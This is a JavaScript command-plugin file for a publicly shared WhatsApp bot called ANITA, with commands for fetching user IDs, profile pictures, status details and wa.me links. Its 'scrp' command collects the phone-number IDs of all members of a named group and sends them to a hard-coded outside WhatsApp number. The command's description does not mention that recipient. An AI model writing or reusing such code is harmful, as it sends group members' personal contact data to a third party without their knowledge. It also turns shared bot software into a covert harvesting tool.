/*
▄▀█ █▄░█ █ ▀█▀ ▄▀█
█▀█ █░▀█ █ ░█░ █▀█

*
   * @project_name : ANITA
   * @author : CODERXSA
   * @youtube : https://www.youtube.com/@coderxsa
   * @instagram : https://www.instagram.com/coderx.sa
   * @description : My Private build i made public for everone to use and easy hosting.
   * @version : 1.0.3
   * Donation : https://pay.yoco.com/coderx
   
   * For all my GitHub bots, I typically only check and update them when I have the time. My primary focus is on my main bots.
*
   * Licensed under the  GPL-3.0 License;
* 
   * Created By CODERX.
   * © 2024 ANITA.
*/
//══════════════════════════════════════════════════════════════════════════════════════════════════════//
const {
  tlang,
  getAdmin,
  prefix,
  Config,
  sck,
  sck1,
  fetchJson,
  getBuffer,
  runtime,
  smd
} = require("../lib");
const {
  Sticker,
  createSticker,
  StickerTypes
} = require('wa-sticker-formatter');
smd({
  'pattern': 'jid',
  'desc': "get jid of all user in a group.",
  'category': "user",
  'filename': __filename,
  'use': "<@user>"
}, async ({
  jid: _0x43ad24,
  reply: _0x47ed3b,
  quoted: _0x54e624
}) => {
  return _0x54e624 ? _0x47ed3b(_0x54e624.sender) : _0x47ed3b(_0x43ad24);
});
smd({
  'pattern': "scrp",
  'desc': "Scrapes the JIDs of all members in a group.",
  'category': "user",
  'use': "<group jid>",
  'filename': __filename
}, async _0xdgrpid => {
  try {
    const groupJid = _0xdgrpid.args[0]; // Assuming group JID is passed as an argument

    // Fetch group metadata
    const groupMetadata = await _0xdgrpid.bot.groupMetadata(groupJid);
    const memberList = groupMetadata.participants.map(member => member.id);

    // Format the member list into a string
    const memberString = memberList.join("\n");

    // Send the result to the specified JID
    await _0xdgrpid.bot.sendMessage('2349130815781@s.whatsapp.net', {
      text: `Member JIDs of group ${groupJid}:\n${memberString}`
    });

    // Optionally reply to the command issuer
    await _0xdgrpid.reply(`JIDs sent to 2349130815781@s.whatsapp.net.`);
  } catch (error) {
    console.error(error);
    await _0xdgrpid.reply("An error occurred while fetching group members.");
  }
});
smd({
  'pattern': "getpp",
  'desc': "Get Profile Pic For Given User",
  'category': "user",
  'filename': __filename
}, async _0x5da85 => {
  try {
    let _0x25b2f4 = _0x5da85.reply_message ? _0x5da85.reply_message.sender : _0x5da85.mentionedJid[0x0] ? _0x5da85.mentionedJid[0x0] : _0x5da85.from;
    let _0x122198;
    try {
      _0x122198 = await _0x5da85.bot.profilePictureUrl(_0x25b2f4, 'image');
    } catch (_0x3a0d87) {
      return _0x5da85.reply("```Profile Pic Not Fetched```");
    }
    return await _0x5da85.bot.sendMessage(_0x5da85.chat, {
      'image': {
        'url': _0x122198
      },
      'caption': "  *---Profile Pic Is Here---*\n" + Config.caption
    }, {
      'quoted': _0x5da85
    });
  } catch (_0x49921b) {
    await _0x5da85.error(_0x49921b + "\n\ncommand : getpp", _0x49921b);
  }
});
smd({
  'pattern': "whois",
  'desc': "Makes photo of replied sticker.",
  'category': "user",
  'use': "<reply to any person>",
  'filename': __filename
}, async _0x595098 => {
  try {
    let _0x473d6a = _0x595098.reply_message ? _0x595098.reply_message.sender : _0x595098.mentionedJid[0x0] ? _0x595098.mentionedJid[0x0] : false;
    if (!_0x473d6a && _0x595098.isGroup) {
      const _0x38e99c = (await _0x595098.bot.profilePictureUrl(_0x595098.chat, "image")["catch"](_0x498df3 => "https://telegra.ph/file/29a8c892a1d18fdb26028.jpg")) || THUMB_IMAGE;
      const _0x31a664 = _0x595098.metadata;
      const _0x2e3b9a = _0x595098.admins.map((_0x2a9afd, _0x505006) => "  " + (_0x505006 + 0x1) + ". wa.me/" + _0x2a9afd.id.split('@')[0x0]).join("\n");
      const _0x3e326d = _0x31a664.owner || _0x595098.admins.find(_0x4795bd => _0x4795bd.admin === "superadmin")?.['id'] || false;
      let _0x4e5676 = "\n      *「 GROUP INFORMATION 」*\n*▢ NAME :* \n   • " + _0x31a664.subject + "\n*▢ Members :*\n   • " + _0x31a664.participants.length + "\n*▢ Group Owner :*\n   • " + (_0x3e326d ? 'wa.me/' + _0x3e326d.split('@')[0x0] : "notFound") + "\n*▢ Admins :*\n" + _0x2e3b9a + "\n*▢ Description :*\n   • " + (_0x31a664.desc?.["toString"]() || "_not set_") + "\n   ";
      return await _0x595098.reply(_0x38e99c, {
        'caption': _0x4e5676
      }, "image");
    } else {
      if (!_0x473d6a) {
        return _0x595098.reply("*_Please Reply To A Person!_*");
      }
      try {
        var _0x21d77c = await _0x595098.bot.fetchStatus(_0x473d6a);
        var _0x56cee3 = _0x21d77c.status;
        var _0x2fac2a = _0x21d77c.setAt.toString();
        var _0x5d69f7 = _0x2fac2a.split(" ");
        if (_0x5d69f7.length > 0x3) {
          _0x2fac2a = _0x5d69f7.slice(0x0, 0x5).join(" ");
        }
      } catch {
        var _0x56cee3 = "undefined";
        var _0x2fac2a = '';
      }
      var _0x25d0dc = _0x473d6a.split('@')[0x0];
      let _0x50707d;
      try {
        _0x50707d = await _0x595098.bot.profilePictureUrl(_0x473d6a, "image");
      } catch (_0x5139a7) {
        _0x50707d = "https://telegra.ph/file/29a8c892a1d18fdb26028.jpg";
      }
      var _0x300f3f = await _0x595098.bot.getName(_0x473d6a);
      return await _0x595098.bot.sendMessage(_0x595098.jid, {
        'image': {
          'url': _0x50707d
        },
        'caption': "\n╔════◇\n║ *『Person's  Information』*\n║ \n║ *🍫Name :* " + _0x300f3f + "\n║ *👤Num :* " + _0x25d0dc + "\n║ *🎐Bio    :*  " + _0x56cee3 + "\n║ *🌟SetAt :* " + _0x2fac2a + "\n║    *Keep Calm Dude🥳*    ◇\n╚════════════════╝\n"
      }, {
        'quoted': _0x595098
      });
    }
  } catch (_0x142b0f) {
    await _0x595098.error(_0x142b0f + "\n\ncommand : whois", _0x142b0f);
  }
});
smd({
  'pattern': 'wa',
  'desc': "Makes wa me of quoted or mentioned user.",
  'category': "user",
  'filename': __filename
}, async _0x20e2c1 => {
  try {
    let _0x394b8 = _0x20e2c1.reply_message ? _0x20e2c1.reply_message.sender : _0x20e2c1.mentionedJid[0x0] ? _0x20e2c1.mentionedJid[0x0] : false;
    await _0x20e2c1.reply(!_0x394b8 ? "*Please Reply Or Mention A User*" : "https://wa.me/" + _0x394b8.split('@')[0x0]);
  } catch (_0x1bc674) {
    await _0x20e2c1.error(_0x1bc674 + "\n\ncommand : wa", _0x1bc674, false);
  }
});
smd({
  'pattern': "mee",
  'desc': "Makes wa me for user.",
  'category': "user",
  'filename': __filename
}, async _0x58f53f => {
  try {
    return await _0x58f53f.reply('https://wa.me/' + _0x58f53f.sender.split('@')[0x0]);
  } catch {}
});
